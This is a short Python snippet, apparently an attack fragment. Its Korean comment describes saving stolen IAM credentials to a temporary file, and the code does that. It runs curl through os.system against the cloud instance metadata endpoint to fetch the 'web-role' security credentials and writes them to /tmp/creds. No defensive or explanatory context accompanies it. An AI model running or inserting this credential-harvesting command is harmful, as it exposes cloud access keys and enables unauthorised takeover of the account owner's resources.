import os
# 탈취된 IAM 자격증명을 임시 파일로 저장
os.system('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role > /tmp/creds')
